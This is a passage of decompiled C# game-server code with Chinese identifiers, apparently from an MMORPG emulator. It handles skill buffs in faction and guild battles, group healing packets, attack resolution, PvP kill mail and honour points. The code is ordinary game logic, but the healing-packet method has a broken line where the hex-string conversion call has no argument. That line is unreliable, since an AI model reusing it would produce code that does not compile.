							Playe.显示大字(Playe.人物全服ID, 582);
						}
						else if ((double)RNG.Next(1, 100) <= Playe.剑百毒不侵)
						{
							Playe.显示大字(Playe.人物全服ID, 571);
						}
						else if (!Playe.检查烈日炎炎状态())
						{
							追加状态类 value13 = new 追加状态类(Playe, 5000, 1008001169, 0);
							Playe.追加状态列表.Add(1008001169, value13);
							Playe.状态效果(BitConverter.GetBytes(1008001169), 1, 5000);
							Playe.更新武功和状态();
							Playe.更新人物数据(Playe);
							Playe.更新广播人物数据();
						}
					}
					if ((double)num < base.升天四式_红月狂风)
					{
						try
						{
							显示大字(base.人物全服ID, 313);
							if (PlayList != null)
							{
								foreach (Players value6 in PlayList.Values)
								{
									if (value6.人物_HP <= 0 || value6.Player死亡 || value6.Client.挂机 || value6.人物全服ID == Playe.人物全服ID || !查找范围玩家(60, value6))
									{
										continue;
									}
									if (base.人物坐标_地图 == 41001)
									{
										if (World.仙魔大战进程 != 2 || base.仙魔大战派别 != value6.仙魔大战派别)
										{
											continue;
										}
									}
									else if (base.人物坐标_地图 == 7301)
									{
										if (World.新门战进程 != 2 || base.帮派名字 != value6.帮派名字)
										{
											continue;
										}
									}
									else if (value6.Player_Zx != base.Player_Zx)
									{
										continue;
									}
									if (!value6.检查红月狂风状态())
									{
										value6.状态效果(BitConverter.GetBytes(1008001172), 1, 5000);
										追加状态类 value14 = new 追加状态类(value6, 5000, 1008001172, 0);
										value6.追加状态列表.Add(1008001172, value14);
										if (value6.怒)
										{
											value6.FLD_人物_追加_攻击 += 150;
											value6.FLD_人物_追加_防御 += 150;
											value6.更新武功和状态();
										}
									}
								}
							}
						}
						catch (Exception)
						{
							if (World.是否开启票红字 == 1)
							{
								MainForm.WriteLine(1, "升天四气功_红月狂风出错!用户[" + base.Userid + "]-[" + base.UserName + "]");
							}
						}
					}
					if ((double)num < base.升天四式_毒蛇出洞 + (double)base.强化防具追加百分比 && !Playe.检查毒蛇出洞状态())
					{
						追加状态类 value15 = new 追加状态类(Playe, 3000, 1008001170, 0);
						Playe.追加状态列表.Add(1008001170, value15);
						Playe.状态效果(BitConverter.GetBytes(1008001170), 1, 3000);
						Playe.更新人物数据(Playe);
						Playe.更新广播人物数据();
						显示大字(base.人物全服ID, 314);
					}
					if ((double)num < base.升天四式_满月狂风)
					{
						try
						{
							if (组队id != 0)
							{
								显示大字(base.人物全服ID, 353);
								if (World.Teams.TryGetValue(组队id, out var value16))
								{
									显示大字(base.人物全服ID, 343);
									foreach (Players value7 in value16.组队列表.Values)
									{
										if (value7.人物_HP > 0 && !value7.Player死亡 && !value7.Client.挂机 && 查找范围玩家(World.群体辅助组队范围, value7) && !value7.检查满月狂风状态() && !value7.怒)
										{
											value7.怒 = true;
											追加状态类 value17 = new 追加状态类(value7, 5000, 1008001171, 0);
											value7.追加状态列表.Add(1008001171, value17);
											value7.状态效果(BitConverter.GetBytes(700014), 1, 5000);
											value7.addFLD_追加百分比_攻击(0.25);
											value7.addFLD_追加百分比_防御(0.25);
											value7.更新人物数据(value7);
											value7.更新广播人物数据();
											value7.更新武功和状态();
										}
									}
								}
							}
						}
						catch
						{
							if (World.是否开启票红字 == 1)
							{
								MainForm.WriteLine(1, "升天四气功_满月狂风 出错!用户[" + base.Userid + "]-[" + base.UserName + "]");
							}
						}
					}
					if ((double)num < base.升天四式_哀鸿遍野)
					{
						try
						{
							显示大字(base.人物全服ID, 604);
							if (PlayList != null)
							{
								foreach (Players value8 in PlayList.Values)
								{
									if (value8.人物_HP <= 0 || value8.Player死亡 || value8.Client.挂机 || !查找范围玩家(60, value8))
									{
										continue;
									}
									if (base.人物坐标_地图 == 41001)
									{
										if (World.仙魔大战进程 != 2 || base.仙魔大战派别 == value8.仙魔大战派别)
										{
											continue;
										}
									}
									else if (base.人物坐标_地图 == 7301)
									{
										if (World.新门战进程 != 2 || base.帮派名字 == value8.帮派名字)
										{
											continue;
										}
									}
									else if (value8.Player_Zx == base.Player_Zx)
									{
										continue;
									}
									if (!value8.检查哀鸿遍野状态())
									{
										value8.FLD_追加哀鸿片野_HP上限 -= 0.15;
										追加状态类 value2 = new 追加状态类(value8, 10000, 1008001176, 0);
										value8.追加状态列表.Add(1008001176, value2);
										value8.状态效果(BitConverter.GetBytes(1008001176), 1, 10000);
										value8.更新人物数据(value8);
										value8.更新广播人物数据();
										value8.更新HP_MP_SP();
									}
								}
							}
						}
						catch (Exception)
						{
							if (World.是否开启票红字 == 1)
							{
								MainForm.WriteLine(1, "升天四气功_哀鸿遍野 出错!用户[" + base.Userid + "]-[" + base.UserName + "]");
							}
						}
					}
					if ((double)num >= base.升天四式_长虹贯天)
					{
						return;
					}
					try
					{
						显示大字(base.人物全服ID, 603);
						if (PlayList == null)
						{
							return;
						}
						foreach (Players value9 in PlayList.Values)
						{
							if (value9.人物_HP <= 0 || value9.Player死亡 || !查找范围玩家(60, value9))
							{
								continue;
							}
							if (base.人物坐标_地图 == 41001)
							{
								if (World.仙魔大战进程 != 2 || base.仙魔大战派别 != value9.仙魔大战派别)
								{
									continue;
								}
							}
							else if (base.人物坐标_地图 == 7301)
							{
								if (World.新门战进程 != 2 || base.帮派名字 != value9.帮派名字)
								{
									continue;
								}
							}
							else if (value9.Player_Zx != base.Player_Zx)
							{
								continue;
							}
							if (!value9.检查长虹贯天状态())
							{
								追加状态类 value3 = new 追加状态类(value9, 5000, 1008001173, 0);
								value9.追加状态列表.Add(1008001173, value3);
								value9.状态效果(BitConverter.GetBytes(1008001173), 1, 5000);
								value9.FLD_人物_追加_攻击 += 100;
								value9.FLD_人物_追加_防御 += 100;
								value9.人物追加最大_HP += 1000;
								value9.人物追加最大_MP += 1000;
								value9.更新HP_MP_SP();
								value9.更新武功和状态();
							}
						}
					}
					catch (Exception)
					{
						if (World.是否开启票红字 == 1)
						{
							MainForm.WriteLine(1, "升天四气功_长虹贯天 出错!用户[" + base.Userid + "]-[" + base.UserName + "]");
						}
					}
				}
				catch (Exception ex4)
				{
					if (World.是否开启票红字 == 1)
					{
						MainForm.WriteLine(1, "升天四气功计算出错!用户[" + base.Userid + "]-[" + base.UserName + "]" + ex4);
					}
				}
			}
			catch (Exception ex5)
			{
				if (World.是否开启票红字 == 1)
				{
					MainForm.WriteLine(1, "升天四气功_触发 出错!用户[" + base.Userid + "]-[" + base.UserName + "]" + ex5.Message);
				}
			}
		}

		public void 发送反伤攻击数据(int 攻击力, int 人物ID)
		{
			byte[] array = Converter.hexStringToByte("AA551B00A42789000C002C0100000F0000000100000000000000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(人物ID), 0, array, 4, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 10, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(攻击力), 0, array, 18, 2);
			发送当前范围广播数据多包(array, array.Length);
		}

		public void 发送医生群疗数据(int 人物ID, TeamClass 组队, int 增加血量, int 武功ID, 武功类 武功)
		{
			try
			{
				byte[] array = Converter.hexStringToByte
				Buffer.BlockCopy(BitConverter.GetBytes(人物ID), 0, array, 10, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(组队.组队列表.Count), 0, array, 16, 1);
				Buffer.BlockCopy(BitConverter.GetBytes(武功ID), 0, array, 20, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(武功.FLD_EFFERT), 0, array, 24, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_X), 0, array, 28, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_Y), 0, array, 36, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(15f), 0, array, 32, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				int num = 0;
				foreach (Players value in 组队.组队列表.Values)
				{
					if (value.Player死亡 || value.人物_HP <= 0)
					{
						continue;
					}
					int num2 = ((value.人物最大_HP - value.人物_HP < 增加血量) ? (value.人物最大_HP - value.人物_HP) : 增加血量);
					if (查找范围玩家(World.群体辅助组队范围, value))
					{
						if (World.群医加经验开关 != 0)
						{
							value.医生群疗_追加_经验百分比 = World.医生群疗经验加成;
							value.医生群疗_追加_爆率 = World.群医加爆率;
						}
						Buffer.BlockCopy(BitConverter.GetBytes(value.人物全服ID), 0, array, 84 + num * 4, 4);
						Buffer.BlockCopy(BitConverter.GetBytes(num2), 0, array, 124 + num * 2, 2);
						value.人物_HP += num2;
						value.更新HP_MP_SP();
					}
					num++;
				}
				if (base.Client != null)
				{
					base.Client.Send多包(array, array.Length);
				}
				发送当前范围广播数据多包(array, array.Length);
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "发送医生群疗数据出错" + base.人物全服ID + "丨" + ex.Message);
			}
		}

		public void 发送医生群体辅助数据(int 人物ID, TeamClass 组队, int 增加血量, int 武功ID, 武功类 武功)
		{
			try
			{
				byte[] array = Converter.hexStringToByte("AA551F0200002F001902FA000000D3A501000000D3A50700C90000000000284400808743008007450000000000000000000000000000000000000000000000000000000000000000000000000000000000000000DA0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000070010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001C1D0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000055AA");
				Buffer.BlockCopy(BitConverter.GetBytes(人物ID), 0, array, 10, 2);
				Buffer.BlockCopy(BitConverter.GetBytes(组队.组队列表.Count), 0, array, 16, 1);
				Buffer.BlockCopy(BitConverter.GetBytes(武功ID), 0, array, 20, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(武功.FLD_EFFERT), 0, array, 24, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_X), 0, array, 28, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_Y), 0, array, 36, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(15f), 0, array, 32, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				int num = 0;
				foreach (Players value in 组队.组队列表.Values)
				{
					if (查找范围玩家(World.群体辅助组队范围, value) && value.人物_HP > 0 && !value.Player死亡)
					{
						Buffer.BlockCopy(BitConverter.GetBytes(value.人物全服ID), 0, array, 84 + num * 4, 4);
						Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, 124 + num * 2, 2);
						num++;
					}
				}
				if (base.Client != null)
				{
					base.Client.Send多包(array, array.Length);
				}
				发送当前范围广播数据多包(array, array.Length);
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "发送弓箭手辅助数据出错" + base.人物全服ID + "丨" + ex.Message);
			}
		}

		public void 魔法使用(double mp)
		{
			try
			{
				switch (base.Player_Job)
				{
				case 5:
				{
					double num2 = base.医_太极心法 * 0.01;
					mp -= mp * num2;
					base.人物_MP -= (int)mp;
					break;
				}
				case 7:
					mp -= (double)(int)(mp * (base.琴师_高山流水 * 0.015));
					base.人物_MP -= (int)mp;
					break;
				case 13:
				{
					double num = base.神女太极心法 * 0.01;
					mp -= mp * num;
					base.人物_MP -= (int)mp;
					break;
				}
				default:
					base.人物_MP -= (int)mp;
					break;
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "魔法使用" + base.人物全服ID + "|" + ToString() + " " + ex.Message);
			}
		}

		public void 讨伐副本伤害排名(NpcClass NPC, int 攻击力)
		{
			try
			{
				if (NPC != null && NPC.Name == "堕落的地狱火龙" && NPC.FLD_PID == 16556 && World.讨伐战副本 != null)
				{
					base.讨伐累计伤害 += 攻击力;
					系统提示("当前累计伤害：" + base.讨伐累计伤害 + "  ", 10, "系统提示");
					DataTable dataTable = RxjhClass.得到讨伐荣誉数据(base.UserName, base.人物分区ID);
					if (dataTable != null)
					{
						int num = (int)dataTable.Rows[0]["FLD_RY"];
						RxjhClass.更新讨伐荣誉(base.UserName, base.帮派名字, base.Player_Zx, base.Player_Level, base.Player_Job, base.Player_Job_leve, num + 攻击力, base.人物分区ID);
						dataTable.Dispose();
					}
					else
					{
						RxjhClass.创建讨伐荣誉(base.UserName, base.帮派名字, base.Player_Zx, base.Player_Level, base.Player_Job, base.Player_Job_leve, 攻击力, base.人物分区ID);
					}
				}
			}
			catch
			{
				MainForm.WriteLine(1, "讨伐累计伤害" + base.人物全服ID);
			}
		}

		public void 攻击计算完成(Players Play, int 人物ID, int 武功ID, int 攻击力, int 攻击类型, int 最后血量, int 障力吸收)
		{
			try
			{
				if (离线自动打怪 == 1)
				{
					假人发呆超时计时器 = 0;
					离线打怪是否有怪打 = 0;
					假人boss排行是否发呆 = 0;
					if (base.Player_Level >= 35 && 攻击力 <= 180)
					{
						base.FLD_人物_追加_攻击 += 20;
					}
				}
				if (设置固定伤害 > 0)
				{
					攻击力 = 设置固定伤害;
					设置固定伤害 = 0;
				}
				if (人物ID >= 1000)
				{
					NpcClass npc = MapClass.GetNpc(base.人物坐标_地图, 人物ID);
					if (npc != null)
					{
						讨伐副本伤害排名(npc, 攻击力);
					}
				}
				if (攻击力 <= 0)
				{
					攻击力 = 0;
				}
				攻击确认时间 = 0;
				上次攻击人物ID = 人物ID;
				int 宠物攻击力 = -1;
				攻击类 攻击类2;
				if (World.TBL_KONGFU.TryGetValue(武功ID, out var value))
				{
					if (人物ID >= 10000)
					{
						if (value.FLD_TYPE == 4 || 触发流星漫天 || 触发杀星义气虎 || 触发杀星义气杀)
						{
							int num = value.FLD_攻击数量;
							if (触发流星漫天)
							{
								num = 5;
							}
							if (触发杀星义气虎)
							{
								num = 5;
							}
							if (触发杀星义气杀)
							{
								num = 1;
							}
							if (触发绝影射魂)
							{
								num = 5;
							}
							if (触发神女传染)
							{
								num = 4;
							}
							if (Play.Player_Job == 1 || Play.Player_Job == 8)
							{
								攻击力 = (int)((double)攻击力 * (1.0 + base.流光乱舞));
							}
							if (Play.Player_Job == 7 && Play.追加状态列表.ContainsKey(900403))
							{
								double 琴_九和弦_状态效果 = base.琴_九和弦_状态效果;
								int fLD_攻击数量 = value.FLD_攻击数量;
								if ((double)RNG.Next(1, 100) < base.琴师_鸾凤和鸣 + base.琴师_升天一气功_飞花点翠 * 0.2)
								{
									显示大字(人物ID, 88);
									base.琴_七和弦_状态效果 *= 2.0 * (1.0 + base.琴师_升天一气功_飞花点翠 * 0.005);
									num = (int)((double)fLD_攻击数量 + 琴_九和弦_状态效果 * 10.0) * 2;
									攻击力 = (int)((double)攻击力 * (1.0 + 琴_九和弦_状态效果 * 2.0));
								}
								else
								{
									num += (int)(1.0 + 琴_九和弦_状态效果 * 10.0);
									攻击力 = (int)((double)攻击力 * (1.0 + 琴_九和弦_状态效果));
								}
							}
							else if (Play.Player_Job == 13)
							{
								攻击力 = (int)((double)攻击力 * (1.0 + base.神女神力激发));
							}
							攻击类2 = ((Play.Player_Job == 13 && 触发杀星义气虎) ? new 攻击类(人物ID, 武功ID, 攻击力, value.FLD_EFFERT, value.FLD_TYPE, 触发杀星义气虎) : ((Play.Player_Job != 13 || !触发杀星义气杀) ? new 攻击类(人物ID, 武功ID, 攻击力, value.FLD_EFFERT, value.FLD_TYPE, 触发流星漫天) : new 攻击类(人物ID, 武功ID, 攻击力, value.FLD_EFFERT, value.FLD_TYPE, 触发杀星义气杀)));
							NpcClass npc2 = MapClass.GetNpc(base.人物坐标_地图, 人物ID);
							if (npc2 == null)
							{
								return;
							}
							攻击类2.群攻.Add(new 群攻击类(人物ID, 武功ID, 攻击力, value.FLD_EFFERT)
							{
								剩余血量 = npc2.Rxjh_HP,
								总血量 = npc2.Max_Rxjh_HP
							});
							List<NpcClass> list = npc2.群攻查找范围Npc2(this, num);
							int num2 = 攻击力 - 攻击力 / 3;
							Random random = new Random();
							if (list != null && list.Count > 0)
							{
								foreach (NpcClass item in list)
								{
									num2 = random.Next(num2 - 15, num2 + 15);
									攻击类2.群攻.Add(new 群攻击类(item.FLD_INDEX, 武功ID, num2, value.FLD_EFFERT)
									{
										剩余血量 = item.Rxjh_HP,
										总血量 = item.Max_Rxjh_HP
									});
									if (攻击类2.群攻.Count >= num)
									{
										break;
									}
								}
							}
							if (人物灵兽 != null)
							{
								宠物攻击力 = ((人物灵兽.FLD_JOB_LEVEL == 1) ? (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中 + 100) : ((人物灵兽.FLD_JOB_LEVEL == 2) ? (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中 + 150) : ((人物灵兽.FLD_JOB_LEVEL != 3) ? (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中) : (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中 + 200))));
							}
							发送群攻攻击数据(Play, 攻击类2.群攻, 人物ID, 武功ID, 攻击力, value.FLD_EFFERT, 宠物攻击力);
							goto IL_0d1e;
						}
						NpcClass npc3 = MapClass.GetNpc(base.人物坐标_地图, 人物ID);
						if (npc3 == null)
						{
							return;
						}
						if (人物灵兽 != null)
						{
							宠物攻击力 = ((人物灵兽.FLD_JOB_LEVEL == 1) ? (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中 + 100) : ((人物灵兽.FLD_JOB_LEVEL == 2) ? (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中 + 150) : ((人物灵兽.FLD_JOB_LEVEL != 3) ? (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中) : (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中 + 200))));
						}
						攻击类2 = new 攻击类(人物ID, 武功ID, 攻击力, value.FLD_EFFERT);
						发送攻击人物数据(Play, 人物ID, 武功ID, 攻击力, value.FLD_EFFERT, 最后血量, 障力吸收, 宠物攻击力);
						goto IL_0d1e;
					}
					if (触发流星漫天 || 触发杀星义气虎 || 触发杀星义气杀)
					{
						int num3 = value.FLD_攻击数量;
						if (触发流星漫天)
						{
							num3 = 1;
						}
						if (触发杀星义气虎)
						{
							num3 = 1;
						}
						if (触发杀星义气杀)
						{
							num3 = 1;
						}
						if (人物灵兽 != null)
						{
							宠物攻击力 = ((人物灵兽.FLD_JOB_LEVEL == 1) ? (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中 + 100) : ((人物灵兽.FLD_JOB_LEVEL == 2) ? (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中 + 150) : ((人物灵兽.FLD_JOB_LEVEL != 3) ? (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中) : (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中 + 200))));
						}
						攻击类 攻击类3 = ((Play.Player_Job == 13 && 触发杀星义气虎) ? new 攻击类(Play.人物全服ID, 武功ID, 攻击力, value.FLD_EFFERT, value.FLD_TYPE, 触发杀星义气虎) : ((Play.Player_Job != 13 || !触发杀星义气杀) ? new 攻击类(Play.人物全服ID, 武功ID, 攻击力, value.FLD_EFFERT, value.FLD_TYPE, 触发流星漫天) : new 攻击类(Play.人物全服ID, 武功ID, 攻击力, value.FLD_EFFERT, value.FLD_TYPE, 触发杀星义气杀)));
						List<Players> list2 = 群攻查找范围RW2(num3);
						int num4 = 攻击力;
						Random random2 = new Random();
						if (list2 != null && list2.Count > 0)
						{
							foreach (Players item2 in list2)
							{
								num4 = random2.Next(num4 - 15, num4 + 15);
								攻击类3.群攻.Add(new 群攻击类(item2.人物全服ID, 武功ID, num4, value.FLD_EFFERT)
								{
									剩余血量 = item2.人物_HP,
									总血量 = item2.人物最大_HP
								});
								if (攻击类3.群攻.Count >= num3)
								{
									break;
								}
							}
						}
						发送群攻攻击数据(Play, 攻击类3.群攻, 人物ID, 武功ID, 攻击力, value.FLD_EFFERT, 宠物攻击力);
					}
					else
					{
						if (人物灵兽 != null)
						{
							宠物攻击力 = ((人物灵兽.FLD_JOB_LEVEL == 1) ? (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中 + 100) : ((人物灵兽.FLD_JOB_LEVEL == 2) ? (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中 + 150) : ((人物灵兽.FLD_JOB_LEVEL != 3) ? (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中) : (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中 + 200))));
						}
						发送攻击人物数据(Play, 人物ID, 武功ID, 攻击力, value.FLD_EFFERT, 最后血量, 障力吸收, 宠物攻击力);
					}
					if (World.开启卡技能 == 0)
					{
						攻击列表.Clear();
					}
					攻击确认次数 = 1;
					using (new Lock(攻击列表, "攻击列表"))
					{
						攻击列表.Add(new 攻击类(人物ID, 武功ID, 攻击力, value.FLD_EFFERT));
					}
					SendPack(Play.人物全服ID, 人物ID, 攻击类型, value.FLD_PID, 1000);
					return;
				}
				NpcClass npc4 = MapClass.GetNpc(base.人物坐标_地图, 人物ID);
				if (人物灵兽 != null)
				{
					宠物攻击力 = ((人物灵兽.FLD_JOB_LEVEL == 1) ? (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中 + 100) : ((人物灵兽.FLD_JOB_LEVEL == 2) ? (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中 + 150) : ((人物灵兽.FLD_JOB_LEVEL != 3) ? (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中) : (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中 + 200))));
				}
				攻击确认次数 = 1;
				if (人物ID >= 10000 && 中级附魂_复仇 != 0 && (double)new Random().Next(1, 100) <= (double)中级附魂_复仇 && npc4.FLD_BOSS == 0)
				{
					攻击力 += (int)((double)npc4.Rxjh_HP * 0.3);
					显示大字(人物ID, 401);
				}
				if (攻击类型 == 128 || 攻击类型 == 129 || 攻击类型 == 130 || 攻击类型 == 131 || 攻击类型 == 132 || 攻击类型 == 133 || 攻击类型 == 136)
				{
					攻击确认次数 = 3;
				}
				发送攻击人物数据(Play, 人物ID, 武功ID, 攻击力, 攻击类型, 最后血量, 障力吸收, 宠物攻击力);
				攻击列表.Clear();
				using (new Lock(攻击列表, "攻击列表"))
				{
					攻击列表.Add(new 攻击类(人物ID, 武功ID, 攻击力, 攻击类型));
				}
				int num5;
				switch (Play.Player_Job)
				{
				case 4:
					num5 = 1000;
					break;
				case 3:
				case 5:
					num5 = 950;
					break;
				case 6:
					num5 = 1000;
					break;
				case 7:
					num5 = 800;
					break;
				default:
					num5 = 700;
					break;
				case 11:
					num5 = 1000;
					break;
				case 12:
					num5 = 950;
					break;
				case 13:
					num5 = 950;
					break;
				}
				if (Play.Player_Job == 6)
				{
					num5 = ((!Play.GetAddState(801201)) ? 500 : 500);
					if (攻击类型 == 129 || 攻击类型 == 130 || 攻击类型 == 131 || 攻击类型 == 132 || 攻击类型 == 133)
					{
						num5 = 500;
					}
				}
				if (Play.装备栏已穿装备[3].Get物品ID == 0)
				{
					num5 = 720;
				}
				SendPack(Play.人物全服ID, 人物ID, 攻击类型, 0, num5);
				goto end_IL_0001;
				IL_0d1e:
				攻击列表.Clear();
				攻击确认次数 = 1;
				using (new Lock(攻击列表, "攻击列表"))
				{
					攻击列表.Add(攻击类2);
				}
				SendPack(Play.人物全服ID, 人物ID, 攻击类型, value.FLD_PID, 1000);
				end_IL_0001:;
			}
			catch (Exception ex)
			{
				拳师连击控制 = 0;
				攻击列表.Clear();
				报错次数阀值++;
				if (World.是否开启票红字 == 1)
				{
					系统提示("你攻击计算完成出错, 请联系客服处理");
					MainForm.WriteLine(1, "攻击计算完成 " + base.人物全服ID + "|" + base.Client.ToString() + " | " + 武功ID + " | " + 人物ID + " | " + base.UserName + " | " + 报错次数阀值 + " | " + ex.Message);
				}
			}
		}

		private void 攻击延迟_Elapsed(object source, ElapsedEventArgs e)
		{
			try
			{
				if (base.Client != null && AtTimerElapsed.攻击状态 && (int)DateTime.Now.Subtract(AtTimerElapsed.攻击时间).TotalMilliseconds > AtTimerElapsed.攻击间隔)
				{
					AtTimerElapsed.攻击状态 = false;
					攻击确认(AtTimerElapsed.攻击者人物ID, AtTimerElapsed.人物ID, AtTimerElapsed.攻击类型);
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "攻击延迟_Elapsed：" + ex.Message);
			}
		}

		public void SendPack(int 攻击者人物ID, int 人物ID, int 攻击模式, int 武功ID, int times)
		{
			try
			{
				AtTimerElapsed.初始化(攻击者人物ID, 人物ID, 武功ID, 攻击模式, times);
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "出错!发送攻击确认包[" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 发送打坐数据()
		{
			try
			{
				if (World.是否开启打坐打怪 == 0)
				{
					AtTimerElapsed.攻击状态 = false;
				}
				if (base.人物PK模式 != 0 && AtTimerElapsed.人物ID < 10000)
				{
					AtTimerElapsed.攻击状态 = false;
				}
			}
			catch
			{
				攻击确认次数 = 1;
			}
		}

		public void 创建杀人传书(Players 杀人者, Players 被杀者)
		{
			try
			{
				if (被杀者.Player_Money < 10000)
				{
					被杀者.系统提示("资金不足。");
					return;
				}
				被杀者.Player_Money -= 10000L;
				被杀者.更新金钱和负重();
				string text = string.Format("不好意思, 刚才手滑了一下, 把你干掉了, 下面是我的信息, 不服来干我!\n\n角色名： {0}\n等级： {1}\n职业： {2}\n转职： {3}\n势力： {4}\n门派： {5}\n生命力： {6}\n最终致命一击： {7}\n被击杀地图： {8}", 杀人者.UserName, 杀人者.Player_Level, World.得到职业文本(杀人者.Player_Job), 杀人者.Player_Job_leve, (杀人者.Player_Level == 1) ? "正" : "邪", 杀人者.帮派名字, 杀人者.人物最大_HP, 被杀者.最终致命一击, 坐标Class.getmapname(杀人者.人物坐标_地图));
				个人传书类 个人传书类2 = new 个人传书类
				{
					传书ID = (int)RxjhClass.GetDBItmeId(),
					传书发送人 = 杀人者.UserName,
					传书内容 = text,
					传书时间 = DateTime.Now,
					是否NPC = 0,
					是否已读 = 0
				};
				被杀者.传书列表.TryAdd(个人传书类2.传书ID, 个人传书类2);
				被杀者.有新传书提示(2, 0);
				byte[] array = Converter.hexStringToByte("AA551000010000B4000100000000000000005DA355AA");
				被杀者.Client.Send(array, array.Length);
				RxjhClass.创建传书(杀人者.UserName, 被杀者.UserName, 0, text, 2);
			}
			catch
			{
			}
		}

		public void 武勋系统(Players players_0, Players players_1)
		{
			if (players_1.人物PK模式 == 0 && players_1.传书杀人名 != base.UserName && !base.Client.假人)
			{
				创建杀人传书(players_0, players_1);
				players_1.传书杀人名 = base.UserName;
			}
			else
			{
				创建杀人传书(players_0, players_1);
			}
			if (players_1.Player_Level < World.武勋保护等级)
			{
				系统提示("你杀死一个等级小于" + World.武勋保护等级 + "的玩家是不能获得武勋的!", 50, string.Empty);
				return;
			}
			if (players_0.Player_WuXun <= 2000)
			{
				系统提示("你的武勋低于2000, 你是得不到武勋的。手下留情吧 大侠!", 50, string.Empty);
				return;
			}
			if (players_1.Player_WuXun <= 0)
			{
				系统提示("对方武勋已经被杀完了, 你是得不到武勋的。手下留情吧 大侠!", 50, string.Empty);
				return;
			}
			if (每日获得武勋 > 计算每日武勋量(base.Player_Job_leve))
			{
				系统提示("你每日杀人武勋已满, 你是得不到武勋的。手下留情吧 大侠!", 50, string.Empty);
				return;
			}
			int num = 1;
			if (检查玩家是否在挂机双倍区域(this) && World.开启双倍扣武勋 != null)
			{
				num = World.双倍扣武勋倍数;
			}
			string[] array = World.死亡减少武勋数量.Split(';');
			string[] array2 = World.系统回收数量.Split(';');
			int num2 = int.Parse(array[0]) * num;
			int num3 = int.Parse(array2[0]) * num;
			int num4 = num2 - num3;
			int num5 = players_1.Player_WuXun - num2;
			if (num5 <= 0)
			{
				players_1.Player_WuXun = 0;
				系统提示("对方武勋等于0不能获得武勋！");
			}
			else
			{
				players_1.Player_WuXun -= num2;
				players_1.被杀次数++;
				players_1.丢失武勋 += num2;
				players_1.系统提示("被" + players_0.UserName + "击杀, 减少" + num2 + "点武勋.当前被杀次数:[" + players_1.被杀次数 + "]次", 50, string.Empty);
				base.Player_WuXun += num4;
				每日获得武勋 += num4;
				base.杀人次数++;
				系统提示("杀死一个玩家并成功吃掉对方武勋" + num4 + "点，系统回收" + num3 + "点.当前杀人次数:[" + base.杀人次数 + "]次", 50, string.Empty);
			}
			players_1.更新武功和状态();
			更新武功和状态();
			RxjhClass.Set个人荣誉数据(6, players_0.UserName, players_0.Player_Job, players_0.Player_Level, players_0.Player_Zx, players_0.帮派名字, string.Empty, 1, players_0.人物分区ID);
		}

		public void 精神宝珠包(int id, double 经验)
		{
			int num = 0;
			for (int i = 0; i < 6; i++)
			{
				if (BitConverter.ToInt32(凝神珠包裹[i].物品ID, 0) == 0)
				{
					continue;
				}
				if (num == 3)
				{
					break;
				}
				if (凝神珠包裹[i].FLD_MAGIC0 == 凝神珠包裹[i].FLD_MAGIC1)
				{
					continue;
				}
				num++;
				bool flag = false;
				if (凝神珠包裹[i].FLD_MAGIC0 == 凝神珠包裹[i].FLD_MAGIC1)
				{
					flag = true;
				}
				else if (凝神珠包裹[i].FLD_MAGIC0 < 凝神珠包裹[i].FLD_MAGIC1)
				{
					int num2 = (int)(经验 / 8.0);
					if (num2 < 0)
					{
						num2 = 1;
					}
					if (公有药品.ContainsKey(1008000312) || 公有药品.ContainsKey(1008000311))
					{
						num2 *= 2;
					}
					凝神珠包裹[i].FLD_MAGIC0 += num2;
					if (凝神珠包裹[i].FLD_MAGIC0 >= 凝神珠包裹[i].FLD_MAGIC1)
					{
